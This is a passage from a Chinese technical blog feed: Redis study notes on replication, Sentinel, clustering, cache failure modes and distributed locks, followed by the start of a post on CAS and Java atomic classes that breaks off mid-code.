中的<strong>数据更加完整</strong>。</p></li></ul><h2 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h2><p>数据流是单项的，从master到slave</p><h3 id="开启-master-的持久化"><a href="#开启-master-的持久化" class="headerlink" title="开启 master 的持久化"></a>开启 master 的持久化</h3><p>如果用 slave node 作为 master node 的数据热备可能在 master 宕机重启的时候数据是空的，然后可能一经过复制， slave node 的数据也丢了。</p><p>另外，master 的各种备份方案，也需要做。<strong>万一本地的所有文件丢失了</strong>，从备份中挑选一份 rdb 去恢复 master，这样才能<strong>确保启动的时候，是有数据的</strong></p><h3 id="心跳检测"><a href="#心跳检测" class="headerlink" title="心跳检测"></a>心跳检测</h3><p>主从节点互相都会发送 heartbeat 信息。</p><p>master 默认每隔 10秒 发送一次 heartbeat</p><p>而slave 呢：</p><ul><li>slave node 每隔 1秒 发送一个 heartbeat。并检查是否有新的 master node 要连接和复制。</li><li>如果有， slave node 发送 <code>ping</code> 命令给 master node。如果 master 设置了 requirepass，那么 slave node 必须发送 masterauth 的口令过去进行认证。</li><li>master node <strong>第一次执行全量复制</strong>，将所有数据发给 slave node。</li><li>而在后续，master node 持续将写命令，<strong>异步复制</strong>给 slave node。</li></ul><h3 id="每次写请求异步复制"><a href="#每次写请求异步复制" class="headerlink" title="每次写请求异步复制"></a>每次写请求异步复制</h3><p>master 每次接收到写命令之后，先在内部写入数据，然后<strong>异步</strong>发送给 slave node。</p><h3 id="全量复制"><a href="#全量复制" class="headerlink" title="全量复制"></a>全量复制</h3><ul><li>从服务器向主服务器发送PSYNC命令，；第一次的话，slave不知道master 的 runid，所以是？,偏移量是-1</li></ul><ol start="2"><li>主服务器验证runid和自身runid是否一致，如不一致，则进行全量复制；</li><li>Master把自己的runid和offset（偏移量）发给slave，slave保存起来</li><li>使用bgsave生成RDB文件。</li></ol><ul><li>由于bgsave是异步的过程，master还可以继续写数据，这一段时间的操作放入缓冲区。</li><li>通过网络磁盘传去，再把缓冲区数据传去。</li><li>Salve会先清除原来的数据，加载RDB和缓冲区数据，写入本地磁盘，然后再从本地磁盘加载到内存</li></ul><p>过程如下图：<br><img src="http://javaduqing.oss-cn-hangzhou.aliyuncs.com/QiuniuTransfer/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-5.png" alt="这里写图片描述"></p><h4 id="开销"><a href="#开销" class="headerlink" title="开销"></a><strong>开销</strong></h4><p>包括以下几个方面：</p><ol><li>bgsave时间</li><li>RDB文件网络传输时间</li><li>从节点清空数据时间</li><li>从节点加载RDB数据时间</li></ol><h3 id="部分复制（增量复制）"><a href="#部分复制（增量复制）" class="headerlink" title="部分复制（增量复制）"></a>部分复制（增量复制）</h3><p>部分复制过程如下图：<br><img src="http://javaduqing.oss-cn-hangzhou.aliyuncs.com/QiuniuTransfer/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-6.png" alt="这里写图片描述"></p><p><strong>部分复制的过程：</strong></p><ol><li><p>当网络发生抖动，slave向master发送连接</p></li><li><p>要求同步master数据，同时自己的传递偏移量和master runid</p></li><li><p>如果runid一致，则查看slave的偏移量和master的偏移量是否一直。如果不一致，则观察偏移量是否超过repl_back_buffer中能存储的数据。</p></li><li><p>如果超过则可能进行全量复制</p></li><li><p>如果未超过则，将repl_back_buffer中存储的数据发送给slave，slave完成数据的同步</p></li></ol><h2 id="哨兵保证高可用"><a href="#哨兵保证高可用" class="headerlink" title="哨兵保证高可用"></a>哨兵保证高可用</h2><p>哨兵使用是raft协议在宕机时的选举保障集群高可用，raft是一个强一致性算法。</p><p>用<strong>流言协议</strong>（gossip protocols)来接收关于主服务器是否下线的信息。</p><h3 id="三个定时任务"><a href="#三个定时任务" class="headerlink" title="三个定时任务"></a>三个定时任务</h3><p>（1）<strong>每隔10s确认主从关系。</strong>每个sentinel会对master节点和slave节点执行info命令，作用就是发现slave节点。当一个主服务器被 Sentinel 标记为客观下线时， Sentinel 向下线主服务器的所有从服务器发送 INFO 命令的频率会从 10 秒一次改为每秒一次。</p><p>（2）<strong>每隔两秒，sentinel都会通过master节点内部的channel来交换信息（基于发布订阅）</strong>。 信息包括Sentinel 的 IP 地址、端口号和运行 ID （runid），互相感知到其他的哨兵的存在。</p><p>（3） <strong>每隔一秒每个sentinel对其他的redis节点（master，slave，sentinel）执行ping操作</strong>，对于master来说，若超过30s内没有回复，就对该master进行主观下线并询问其他的Sentinel节点是否可以客观下线。</p><h3 id="主观下线和-客观下线"><a href="#主观下线和-客观下线" class="headerlink" title="主观下线和 客观下线"></a>主观下线和 客观下线</h3><ul><li>sdown 是主观宕机，就一个哨兵如果自己觉得一个 master 宕机了，那么就是主观宕机</li><li>odown 是客观宕机，如果 quorum 数量的哨兵都觉得一个 master 宕机了，那么就是客观宕机</li></ul><p>sdown 达成的条件很简单，如果一个哨兵 ping 一个 master，超过了 <code>is-master-down-after-milliseconds</code> 指定的毫秒数之后，就主观认为 master 宕机了；如果一个哨兵在指定时间内，收到了 quorum 数量的其它哨兵也认为那个 master 是 sdown 的，那么就认为是 odown 了。</p><h3 id="sentinel领导选举与法定人数"><a href="#sentinel领导选举与法定人数" class="headerlink" title="sentinel领导选举与法定人数"></a>sentinel领导选举与法定人数</h3><p>。原因:只有一个sentinel节点完成故障转移<br>。选举:通过sentinel is-master-down-by-addr命令都希望成为领导者<br>    1,每个做主观下线的Sentinel节点向其他Sentinel节点发送命令,要求将它设置为领导者.<br>    2,收到命令的Sentinel节点如果没有同意通过其他Sentinel节点发送命令,那么将同意该请求，否则拒绝<br>    3,如果该Sentinel节点发现自己的票数已经超过Sentinel集合半数且超过quorum,那么它将成为领导者<br>    4,如果此过程有多个Sentinel节点成为了领导者,那么将等待一段时间重新进行选举</p><p>备注：quorum可以在sentinel的conf里配置,后面的2就是法定人数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sentinel monitor mymaster 127.0.0.1 6379 2</span><br></pre></td></tr></table></figure><p>法定人数需要比一般的哨兵数还大，如果小于，法定人数为一半以上的哨兵数。</p><p>如果 quorum &lt; majority，比如 5 个哨兵，majority 就是 3，quorum 设置为 2，那么就 3 个哨兵授权就可以执行切换。</p><p>但是如果 quorum &gt;= majority，那么必须 quorum 数量的哨兵都授权，比如 5 个哨兵，quorum 是 5，那么必须 5 个哨兵都同意授权，才能执行切换。</p><h3 id="master选举算法"><a href="#master选举算法" class="headerlink" title="master选举算法"></a>master选举算法</h3><p>如果一个 master 被认为 odown 了，而且 majority 数量的哨兵都允许主备切换</p><p>首先如果一个 slave 跟 master 断开连接的时间已经超过了 <code>down-after-milliseconds</code> 的 10 倍，外加 master 宕机的时长，那么 slave 就被认为不适合选举为 master。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(down-after-milliseconds * 10) + milliseconds_since_master_is_in_SDOWN_state</span><br></pre></td></tr></table></figure><p>接下来会对 slave 进行排序：</p><ul><li>按照 slave 优先级进行排序，slave priority 越低，<strong>优先级</strong>就越高。</li><li>如果 slave priority 相同，那么看 replica <strong>offset</strong>，哪个 slave 复制了越多的数据，offset 越靠后，优先级就越高。</li><li>如果上面两个条件都相同，那么选择一个 <strong>run id</strong> 比较小的那个 slave。</li></ul><h3 id="slave-配置的自动纠正"><a href="#slave-配置的自动纠正" class="headerlink" title="slave 配置的自动纠正"></a>slave 配置的自动纠正</h3><p>哨兵会负责自动纠正 slave 的一些配置，比如 slave 如果要成为潜在的 master 候选人，哨兵会确保 slave 复制现有 master 的数据；如果 slave 连接到了一个错误的 master 上，比如故障转移之后，那么哨兵会确保它们连接到正确的 master 上。</p><p>slave上升为master日志中可以发现，这一条配置重写的日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">989:M 21 Aug 19:20:42.729 # CONFIG REWRITE executed with success.</span><br></pre></td></tr></table></figure><h2 id="数据丢失"><a href="#数据丢失" class="headerlink" title="数据丢失"></a>数据丢失</h2><h3 id="脑裂"><a href="#脑裂" class="headerlink" title="脑裂"></a>脑裂</h3><p>脑裂，某个 master 掉线了一会，但是实际上还运行着。此时哨兵可能就会认为 master 宕机了，然后开启选举，集群里就会有两个 master ，也就是所谓的脑裂。 client 还没来得及切换到新的 master，还继续向旧 master 写数据。因此旧 master 再次恢复的时候，会被作为一个 slave 挂到新的 master 上去，自己的数据会清空，重新从新的 master 复制数据。而新的 master 并没有后来 client 写入的数据，因此，这部分数据也就丢失了。</p><p>解决方案</p><p>进行如下配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">min-slaves-to-write 1</span><br><span class="line">min-slaves-max-lag 10</span><br></pre></td></tr></table></figure><p>表示，要求至少有 1 个 slave，数据复制和同步的延迟不能超过 10 秒。</p><p>如果说一旦所有的 slave，数据复制和同步的延迟都超过了 10 秒钟，那么这个时候，master 就不会再接收任何请求了。在脑裂场景下，最多就丢失 10 秒的数据。</p><h3 id="异步复制"><a href="#异步复制" class="headerlink" title="异步复制"></a>异步复制</h3><p>因为 master-&gt;slave 的复制是异步的，所以可能有部分数据还没复制到 slave，master 就宕机了，此时这部分数据就丢失了。</p><h2 id="Redis-集群"><a href="#Redis-集群" class="headerlink" title="Redis 集群"></a>Redis 集群</h2><p>数据分片：按某种规则对海量数据划分，分散存储多个结点上。</p><p>常见的数据分布方式有两种</p><ol><li>哈希分布：分散高，与业务无关，无法顺序访问</li><li>顺序分布：分散低易倾斜，与业务有关，可顺序访问</li></ol><p>redis哈希分布，但不是简单的取模，因为这样动态的添加/删除结点会大费周章</p><h3 id="一致性哈希分区"><a href="#一致性哈希分区" class="headerlink" title="一致性哈希分区"></a>一致性哈希分区</h3><p>一致性 hash 算法将整个 hash 值空间组织成一个虚拟的圆环，整个空间按顺时针方向组织，下一步将各个 master 节点（使用服务器的 ip 或主机名）进行 hash。这样就能确定每个节点在其哈希环上的位置。</p><p>来了一个 key，首先计算 hash 值，并确定此数据在环上的位置，从此位置沿环<strong>顺时针“行走”</strong>，遇到的第一个 master 节点就是 key 所在位置。</p><p>在一致性哈希算法中，如果一个节点挂了，受影响的数据仅仅是此节点到环空间前一个节点（沿着逆时针方向行走遇到的第一个节点）之间的数据，其它不受影响。增加一个节点也同理。</p><p><strong>一致性Hash算法对于节点的增减都只需重定位环空间中的一小部分数据，具有较好的容错性和可扩展性。</strong></p><p>燃鹅，一致性哈希算法在<strong>节点太少</strong>时，容易因为节点分布不均匀而造成<strong>缓存热点/数据倾斜</strong>的问题。为了解决这种热点问题，一致性 hash 算法引入了虚拟节点机制，即对每一个节点计算多个 hash，每个计算结果位置都放置一个<strong>虚拟节点</strong>。这样就实现了数据的均匀分布，负载均衡。</p><p><a href="https://github.com/doocs/advanced-java/blob/master/images/consistent-hashing-algorithm.png" target="_blank" rel="noopener"><img src="https://github.com/doocs/advanced-java/raw/master/images/consistent-hashing-algorithm.png" alt="consistent-hashing-algorithm"></a></p><h3 id="hash-slot-算法"><a href="#hash-slot-算法" class="headerlink" title="hash slot 算法"></a>hash slot 算法</h3><p>redis cluster 有固定的 <code>16384</code> 个 hash slot，对每个 <code>key</code> 计算 <code>CRC16</code> 值，然后对 <code>16384</code> 取模，可以获取 key 对应的 hash slot。</p><p>redis cluster 中每个 master 都会持有部分 slot，比如有 3 个 master，那么可能每个 master 持有 5000 多个 hash slot。hash slot 让 node 的增加和移除很简单，增加/减少一个 master，就将它的 hash slot 移动。移动 hash slot 的成本是非常低的。客户端的 api，可以对指定的数据，让他们走同一个 hash slot，通过 <code>hash tag</code> 来实现。</p><p>与取模分片的区别在于，hashsolt把%的数据量变大了，任何一台机器宕机，另外两个节点，不影响的。因为 key 找的是 hash slot，不是机器。</p><p><a href="https://github.com/doocs/advanced-java/blob/master/images/hash-slot.png" target="_blank" rel="noopener"><img src="https://github.com/doocs/advanced-java/raw/master/images/hash-slot.png" alt="hash-slot"></a></p><ol><li>虚拟槽分区</li></ol><h3 id="高可用"><a href="#高可用" class="headerlink" title="高可用"></a>高可用</h3><p>redis cluster 的高可用的原理，几乎跟哨兵是类似的。</p><h4 id="判断节点宕机，主观-客观下线"><a href="#判断节点宕机，主观-客观下线" class="headerlink" title="判断节点宕机，主观+客观下线"></a>判断节点宕机，主观+客观下线</h4><p>cluster-node-timeout<code>内，某个节点一直没有返回</code>pong<code>，那么就被认为</code>pfail`。</p><p><code>pfail</code>，<strong>主观宕机</strong>。类似odown。</p><p>fail，<strong>客观宕机</strong>。类似sdown。超过半数的节点都认为 <code>pfail</code> 了，那么就会变成 <code>fail</code>。</p><h4 id="新master-选举"><a href="#新master-选举" class="headerlink" title="新master 选举"></a>新master 选举</h4><p>对宕机的 master node，从其所有的 slave node 中，选择一个切换成 master node。</p><ul><li>断开连接的时间超过了 <code>cluster-node-timeout * cluster-slave-validity-factor</code>，<strong>没有资格</strong>切换成 <code>master</code>。</li><li>offset越大，优先进行选举。</li><li>选举投票，拥有N/2 + 1票的结点选举通过成为master。</li><li>从节点执行主备切换，从节点切换为主节点。</li></ul><p>与主从复制和哨兵</p><p><strong>二者都可以做到高并发高性，用哪个主要看数据量</strong></p><p>如果你的数据量很少就几个 G，单机就足够了，可以自己搭建一个 sentinel 集群去保证 redis 主从架构的高可用性。</p><p>redis cluster，主要是针对<strong>海量数据+高并发+高可用</strong>的场景。redis cluster 还可以支持横向扩容更多的 master 节点。</p><h3 id="节点间的内部通信机制"><a href="#节点间的内部通信机制" class="headerlink" title="节点间的内部通信机制"></a>节点间的内部通信机制</h3><h4 id="基本通信原理"><a href="#基本通信原理" class="headerlink" title="基本通信原理"></a>基本通信原理</h4><p>集群元数据的维护有两种方式：集中式、Gossip 协议。redis cluster 节点间采用 gossip 协议进行通信。</p><ul><li>集中式是将集群元数据（节点信息、故障等等）集中存储在某个节点上。</li><li>gossip` 协议，所有节点都持有一份元数据，元数据的变更会发送给其它的节点通知变更。</li></ul><p>集中式的好处在于，元数据时效常好。不好在于，集中存储元数据有更新访问压力。</p><p>gossip 正好相反。好处在于，元数据分散，降低了压力；不好在于，元数据更新滞后。</p><h4 id="gossip-协议"><a href="#gossip-协议" class="headerlink" title="gossip 协议"></a>gossip 协议</h4><ul><li>10000 端口：每个节点都有一个专门用于节点间通信的端口，就是自己提供服务的端口号+10000，比如 7001，那么用于节点间通信的就是 17001 端口。每个节点每隔一段时间都会往另外几个节点发送 <code>ping</code> 消息，同时其它几个节点接收到 <code>ping</code> 之后返回 <code>pong</code>。</li><li>交换的信息：信息包括故障信息，节点的增加和删除，hash slot 信息等等。</li></ul><p>Gossip协议的主要职责就是信息交换。信息交换的载体就是节点彼此发送的Gossip消息，常用的Gossip消息可分为：ping消息、pong消息、meet消息、fail消息</p><ul><li>meet消息：<strong>用于通知新节点加入</strong>。消息发送者通知接收者加入到当前集群，meet消息通信正常完成后，接收节点会加入到集群中并进行周期性的ping、pong消息交换</li><li>ping消息：<strong>集群内交换最频繁的消息，</strong>集群内每个节点每秒向多个其他节点发送ping消息，用于检测节点是否在线和交换彼此状态信息。ping消息发送封装了自身节点和部分其他节点的状态数据</li><li>pong消息：当接收到ping、meet消息时，<strong>作为响应消息回复</strong>给发送方确认消息正常通信。pong消息内部封装了自身状态数据。节点也可以向集群内广播自身的pong消息来通知整个集群对自身状态进行更新</li><li>fail消息：<strong>用于主观下线到客观下线</strong>。判断为主观节点后就发送 fail 给其它节点 。</li></ul><h2 id="雪崩、穿透和击穿"><a href="#雪崩、穿透和击穿" class="headerlink" title="雪崩、穿透和击穿"></a>雪崩、穿透和击穿</h2><p>雪崩：缓存管理，请求全打在数据库上，把数据库也打挂了。</p><ul><li>事前：redis 高可用，主从+哨兵，redis cluster，避免全盘崩溃。</li><li>事中：本地 ehcache 缓存 + hystrix 限流&amp;降级，避免 MySQL 被打死。</li><li>事后：redis 持久化，一旦重启，自动从磁盘上加载数据，快速恢复缓存数据。</li></ul><p>用户发送一个请求，系统 A 收到请求后，先查本地 ehcache 缓存，如果没查到再查 redis。如果 ehcache 和 redis 都没有，再查数据库，将数据库中的结果，写入 ehcache 和 redis 中。</p><p>限流组件，可以设置每秒的请求，有多少能通过组件，剩余的未通过的请求，怎么办？<strong>走降级</strong>！可以返回一些默认的值，或者友情提示，或者空白的值。</p><p>好处：</p><ul><li>数据库绝对不会死，限流组件确保了每秒只有多少个请求能通过。</li><li>只要数据库不死，就是说，对用户来说，2/5 的请求都是可以被处理的。</li><li>只要有 2/5 的请求可以被处理，就意味着你的系统没死，对用户来说，可能就是点击几次刷不出来页面，但是多点几次，就可以刷出来一次。</li></ul><h3 id="缓存穿透"><a href="#缓存穿透" class="headerlink" title="缓存穿透"></a>缓存穿透</h3><p>缓存穿透，即黑客发几千个不存在的恶意攻击请求。缓存中查不到，会直接去数据库里查（当然也查不到）。但<strong>这种恶意攻击场景的缓存穿透就会直接把数据库给打死。</strong></p><p>解决：每次系统 A 从数据库中只要没查到，就写一个空值到缓存里去，比如 <code>set -999 UNKNOWN</code>。然后设置一个过期时间，这样的话，下次有相同的 key 来访问的时候，在缓存失效之前，都可以直接从缓存中取数据。</p><p>但是如果<strong>key是随机生成</strong>的，这样的做法就用处不大了。可以<strong>布隆过滤器</strong>解决，请求过来，先调用布隆过滤器判断数据是否存在。如果不存在的数据，就不要把请求引向数据库。直接过滤掉了大量不存在的数据攻击。redis就带有bitmap哦，我猜就是做这个功能的。</p><h3 id="缓存击穿"><a href="#缓存击穿" class="headerlink" title="缓存击穿"></a>缓存击穿</h3><p>缓存击穿，就是说某个 key 非常热点，访问非常频繁，处于集中式高并发访问的情况，<strong>当这个 key 在失效的瞬间</strong>，大量的请求就击穿了缓存，直接请求数据库，就像是在一道屏障上凿开了一个洞。</p><p>解决方式也很简单，可以将热点数据设置为永远不过期；或者基于 redis or zookeeper 实现互斥锁，等待第一个请求构建完缓存之后，再释放锁，进而其它请求才能通过该 key 访问数据。</p><h2 id="缓存与数据库的双写一致性"><a href="#缓存与数据库的双写一致性" class="headerlink" title="缓存与数据库的双写一致性"></a>缓存与数据库的双写一致性</h2><p>问题1：先更新数据库，再删除缓存。如果删除缓存失败了，那么会导致数据库中是新数据，缓存中是旧数据，数据就出现了不一致。</p><p>解决思路：<strong>先删除缓存，再更新数据库。</strong>如果数据库更新失败了，那么数据库中是旧数据，缓存中是空的，那么数据不会不一致。因为读的时候缓存没有，所以去读了数据库中的旧数据，然后更新到缓存中。（每天上亿的读请求，每秒并发读几万）</p><p>问题2：数据发生了变更，先删除了缓存，然后要去修改数据库，此时还没修改。一个请求过来，去读缓存，发现缓存空了，去查询数据库，查到了修改前的旧数据，放到了缓存中。随后数据变更的程序完成了数据库的修改。造成不一致<br>解决思路(1)：写请求先删除缓存，再去更新数据库，（异步等待段时间)再删除缓存（成功表示有脏数据出现）。这种方案读取快速，但会出现短时间的脏数据。</p><p>解决思路(2)：<strong>写请求先修改缓存为指定值，再去更新数据库</strong>，再更新缓存。读请求过来后，先读缓存，判断是指定值后进入循环状态，等待写请求更新缓存。如果循环超时就去数据库读取数据，更新缓存。这种方案保证了读写的一致性，但是读请求会等待写操作的完成，降低了吞吐量</p><h2 id="分布式锁"><a href="#分布式锁" class="headerlink" title="分布式锁"></a>分布式锁</h2><p> 3 个考量点：</p><ul><li>互斥（只能有一个客户端获取锁）</li><li>不能死锁</li><li>容错（只要大部分 redis 节点创建了这把锁就可以）</li></ul><h3 id="setnx"><a href="#setnx" class="headerlink" title="setnx"></a><code>setnx</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET resource_name my_random_value NX PX 30000</span><br></pre></td></tr></table></figure><ul><li><code>NX</code>：表示只有 <code>key</code> 不存在的时候才会设置成功。（如果此时 redis 中存在这个 key，那么设置失败，返回 <code>nil</code>）</li><li><code>PX 30000</code>：意思是 30s 后锁自动释放。别人创建的时候如果发现已经有了就不能加锁了。</li></ul><p>但这种简单的实现方式，如果单实例，就单点故障。如果是普通主从，如果主节点挂了（key 就没有了），key 还没同步到从节点，此时从节点切换为主节点，别人就可以 set key，从而拿到锁。</p><h4 id="RedLock-算法"><a href="#RedLock-算法" class="headerlink" title="RedLock 算法"></a>RedLock 算法</h4><p>这个场景是假设有一个 redis cluster，有 5 个 redis master 实例。然后执行如下步骤获取一把锁：</p><ol><li>获取当前时间戳，单位是毫秒；</li><li>跟上面类似，轮流尝试在每个 master 节点上创建锁，过期时间较短，一般就几十毫秒；</li><li>尝试在<strong>大多数节点</strong>上建立一个锁，比如 5 个节点就要求是 3 个节点 <code>n / 2 + 1</code>；</li><li>客户端计算建立好锁的时间，如果建立锁的时间小于超时时间，就算建立成功了；</li><li>要是锁建立失败了，那么就依次之前建立过的锁删除；</li><li>只要别人建立了一把分布式锁，你就得<strong>不断轮询去尝试获取锁</strong>。</li></ol><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>此处笔记比较潦草简单，可略过不看。</p><h3 id="用redis实现一个异步队列"><a href="#用redis实现一个异步队列" class="headerlink" title="用redis实现一个异步队列"></a>用redis实现一个异步队列</h3><p>有三种方式</p><p>1.prush+lpop 非阻塞，应用层加入sleep机制<br>2.prush+bpop阻塞 只能供一个消费者消费<br>2.pub+sub主题订阅 无状态不保证消息一定到达 想要进阶只能用kafka消息队列</p><h3 id="慢查询"><a href="#慢查询" class="headerlink" title="慢查询"></a>慢查询</h3><p>慢查询队列：</p><ol><li>FIFO</li><li>固定长度，超过会丢弃</li><li>保存在内存里</li></ol><p>注意：查询的生命周期，慢查询不是发生在网络请求和排队上</p><p>两个配置 </p><ul><li>showlog-log-slower-than最慢超过多少就会记录</li><li>showlog-max-len队列最大长度</li></ul><p>三个命令 </p><ul><li>获取慢查询队列</li><li>获取慢查询队列长度</li><li>清空慢查询</li></ul><p>运维经验：慢查询定期持久化</p><h3 id="pipeline"><a href="#pipeline" class="headerlink" title="pipeline"></a>pipeline</h3><p>流水线：redis命令是超快，但网络请求时间慢，于是有了流水线——多个命令一起请求。这样，把n次命令+n次网络请求的时间就缩减为n次命令+1次网络的时间</p><p>使用建议<br>1.注意每次pipeline携带数据量<br>2.pipeline每次只能作用在一个Redis节点上<br>3.M操作和pipeline的区别</p><h3 id="发布订阅"><a href="#发布订阅" class="headerlink" title="发布订阅"></a>发布订阅</h3><p>三个角色：发布者(publisher)、订阅者(subscriber)、频道(channel) </p><p>发布者发布消息到频道上，订阅者订阅频道就会收到消息</p><h4 id="API"><a href="#API" class="headerlink" title="API"></a>API</h4><p>publish<br>unsubscribe<br>subscribe</p><p>与消息队列的区别：不是专业的，不能保证消息的可靠。新上线的订阅者不会收到以前的消息。</p><p>与生产消费模式的区别：生产消费模式中，发布者发布一条，只有一个订阅者能够收到。而redis相当于一个广播，每一个订阅者都能收到。</p>]]></content>
      
      
      <categories>
          
          <category> 秋招 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CAS核心原理</title>
      <link href="/2019/08/25/CAS/"/>
      <url>/2019/08/25/CAS/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="CAS介绍"><a href="#CAS介绍" class="headerlink" title="CAS介绍"></a>CAS介绍</h1><h2 id="什么是乐观锁和悲观锁？"><a href="#什么是乐观锁和悲观锁？" class="headerlink" title="什么是乐观锁和悲观锁？"></a>什么是乐观锁和悲观锁？</h2><p>众所周知，悲观锁的先加锁在操作，因为悲观锁悲观的认为一定会有别的线程来修改数据。而乐观锁不同，它先操作，在判断数据是否被修改，修改就重试或者抛出异常，因为乐观锁乐观的认为不会有别的线程来修改数据（有句谚语：原谅比准许更容易得到。）。它两的<strong>关键区别在于是先加锁还是先操作</strong>。</p><h2 id="cas是怎么解决线程不安全的问题？"><a href="#cas是怎么解决线程不安全的问题？" class="headerlink" title="cas是怎么解决线程不安全的问题？"></a>cas是怎么解决线程不安全的问题？</h2><p>在多线程更新一个变量的情况下，可能会出现这样的问题，当a线程拷贝了一份主内存的变量到工作内存进行计算的时候，这个变量已经其他线程改变了，a做完了计算，此时的结果的错误的，如果刷新到主内存会覆盖中间其他线程的改变，因此我们希望出现这种情况的时候，<strong>a能检测到此时的数据已经变脏，并把这个计算结果丢弃，重新计算，这就是cas。</strong></p><p>CAS全称 Compare And Swap（比较与交换），CAS更新的值是原值算出来的，<strong>如果原值已经被更改了，那么自增的更新值肯定也不对了。</strong>最后一步要赋值的时候，把主内存的值与之前没计算的值做比较，相等一步到位把值更新了，不相等就放弃计算出来的值。</p><h1 id="CAS关键"><a href="#CAS关键" class="headerlink" title="CAS关键"></a>CAS关键</h1><p>关键在于，比较与交换这个<strong>两个步骤</strong>，在操作系统中对应的是<strong>一条处理器指令</strong>——CMPXCHG指令，而它是原子的！</p><p>两个步骤是怎么做到原子的呢？当然是加锁啦，CAS通过LOCK CMPXCHG<code>（带</code>LOCK`前缀）来加锁。是不是有点晕了，说好的CAS是无锁的呢！其实，无锁算法的并不是完全消除同步、完全不加锁，只是它将同步减少到<strong>CPU本身提供的单个指令原子操作</strong>。</p><p>无锁指的是不加high-level locks。high-level locks指可以保证任何时间只有一个线程操作数据的那种锁，想做到这个地步，它必须将其他线程挂起，将一个线程挂起大概花费<strong>8万个时钟周期</strong>，而且它还需要维护一个线程的等待队列（就像AQS所做的一样）。这与CPU 的LOCK前缀功能完全不同，LOCK前缀仅保护<strong>单个指令原子性</strong>，因此可能仅在该单个指令的持续时间内保留其他线程。这是由CPU本身实现的，一条指令大概花费<strong>3个时钟周期</strong>。当然CAS失败之后需要重试，但不论如何都比直接挂起线程效率高。</p><p>可以想想，悲观锁在操作的过程一直持有锁。而乐观锁操作的过程是没有加锁的，其他线程也可以修改这个数据，乐观锁只有在最后的比较交换这条cpu指令加锁检查是否出现不一致。</p><p><a href="https://stackoverflow.com/questions/27837731/is-x86-cmpxchg-atomic-if-so-why-does-it-need-lock" target="_blank" rel="noopener">如果还不理解可以看看stackoverflow的这个回答</a></p><p>CAS的问题</p><ol><li><p>ABA问题</p><p>CAS需要在操作值的时候检查内存值是否发生变化，没有发生变化才会更新内存值。但是如果内存值原来是A，后来变成了B，然后又变成了A，那么CAS进行检查时会发现值没有发生变化，但是实际上是有变化的。<strong>ABA问题的解决思路就是在变量前面添加版本号，每次变量更新的时候都把版本号加一，这样变化过程就从“A－B－A”变成了“1A－2B－3A”。</strong></p><p><em>JDK从1.5开始提供了<strong>AtomicStampedReference</strong>类来解决ABA问题，具体操作封装在compareAndSet()中。compareAndSet()首先检查当前引用和当前标志与预期引用和预期标志是否相等，如果都相等，则以原子方式将引用值和标志的值设置为给定的更新值。</em></p></li><li><p><strong>循环时间长开销大</strong>。CAS操作如果长时间不成功，会导致其一直自旋，给CPU带来非常大的开销。</p></li></ol><h2 id="volatile-Unsafe"><a href="#volatile-Unsafe" class="headerlink" title="volatile+Unsafe"></a>volatile+Unsafe</h2><p>value是一个volatile变量，因此JVM可以保证任何时刻任何线程都能拿到该变量的最新值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private volatile int value;</span><br></pre></td></tr></table></figure><p>整个atomic都是基于<code>Unsafe</code>实现的，这个类里都是native本地方法。Unsafe通过通过单例模式来提供实例对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">boolean</span> <span class="title">compareAndSwapInt</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            Object o, <span class="keyword">long</span> offset, <span class="keyword">int</span> expected, <span class="keyword">int</span> x)</span></span>;</span><br></pre></td></tr></table></figure><p>这个方法可以在获得对象o的<strong>内存偏移量</strong>offset后与期望值比较，如果等于期望值，就更新为x。</p><p>一个对象的属性=该对象在内存当中的偏移量，这样我们就可以根据这个偏移量在对象内存当中找到这个属性。这直接操作内存的。</p><p><strong>为什么要直接操作内存呢？因为快呀。尤其当被修改的属性是一个对象的时候。</strong></p><p><em>插一嘴题外话，为什么它叫unsafe类？因为它封装了一些计算指针偏移量的操作，这种指针操作是很危险的，指针操作不当有可能覆盖别人的内存导致系统崩溃。Java抛弃了指针，jdk是不许用户应用程序获取Unsafe这个类的实例。在获得唯一可以Unsafe类实例的工厂方法里，它会检查调用类的类加载器如果不为null，就抛出异常拒绝工作。而只有Bootstrap类加载器会返回null。也就是说我们自己写的java类是无法直接使用Unsafe类（除非用反射）</em></p><p>这里我们主要关注它提供的几个方法：</p><h1 id="CAS实现"><a href="#CAS实现" class="headerlink" title="CAS实现"></a>CAS实现</h1><p>JDK中juc并发包里有12个原子类，原子类顾名思义是为了使操作是原子的，而实现的原理正是CAS。</p><h3 id="12个类"><a href="#12个类" class="headerlink" title="12个类"></a>12个类</h3><h4 id="原子更新基本类型3个"><a href="#原子更新基本类型3个" class="headerlink" title="原子更新基本类型3个"></a>原子更新基本类型3个</h4><ul><li>AtomicBoolean</li><li>AtomicInteger</li><li>AtomicLong</li></ul><p>1.7,1.8 的实现方式有一丝丝的不同，1.7看似更好理解，这里以1.7为例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span 